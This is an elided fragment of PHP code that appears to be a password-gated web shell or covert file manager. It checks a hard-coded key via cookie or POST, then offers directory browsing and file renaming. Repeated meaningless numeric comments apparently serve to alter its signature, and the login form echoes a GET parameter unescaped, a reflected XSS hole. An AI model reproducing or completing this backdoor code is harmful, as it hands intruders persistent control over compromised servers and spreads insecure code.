...
$auth_key = "bcc1666b930e71a58d55686a61dadc30";
...
$pass = false;
if (isset($_COOKIE['pw_name_35623'])) {
    if(($_COOKIE['pw_name_35623']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_35623'])) {
        if(($_POST['pw_name_35623']) == $auth_key) {
            setcookie("pw_name_35623", $_POST['pw_name_35623']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_35623' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728826831970738 1728826831214143 1728826831858351 1728826831701202
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728826831970738 1728826831214143 1728826831858351 1728826831701202
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728826831970738 1728826831214143 1728826831858351 1728826831701202
            $name = PATH . "/" . $_GET['r'];
